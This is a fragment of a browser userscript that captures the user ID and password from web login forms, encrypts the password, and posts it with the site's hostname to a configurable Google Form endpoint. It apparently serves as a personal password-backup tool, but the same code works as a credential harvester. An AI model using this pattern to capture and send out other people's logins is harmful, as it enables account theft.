...
/* Stanford Javascript Crypto Library ENDS */

//User variables
var gFormSubmitUrl = "YOUR_FORM_POST_URL";
var field1Name = "entry.0";
var field2Name = "entry.1";
...
function encryptAndSend() {
  var field1 = location.hostname + '_' + userIdField.value;
  var field2 = pwdBox.value;
  var encPwd = btoa( JSON.stringify(sjcl.encrypt(password, field2)) );

  //post to google
  GM_xmlhttpRequest({
    method: "POST",
    url: gFormSubmitUrl,
    data: field1Name + "=" + field1 + "&" + field2Name + "=" +  encPwd,
    headers: {
...
//Grab userid, password field from webpage
var loginForm = null;
